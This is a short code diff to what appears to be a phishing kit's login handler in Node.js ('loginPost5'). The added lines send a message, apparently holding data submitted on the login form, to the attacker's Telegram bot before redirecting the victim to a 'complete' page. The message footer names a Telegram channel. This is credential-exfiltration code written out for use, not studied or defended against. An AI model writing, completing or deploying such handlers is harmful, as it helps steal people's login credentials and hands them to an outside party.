@@ -259,6 +259,9 @@ exports.loginPost5 = async (req, res) => {
 		`💬 Telegram: https://t.me/UpdateTeams\n` +
 		`🌐 Website: Coming soon!!\n`;
 
+		const sendMessage = sendMessageFor(botToken, chatId); // Make sure sendMessageFor is defined
+        sendMessage(message);
+
 		
 		res.redirect("/auth/complete");
 	} catch (error) {
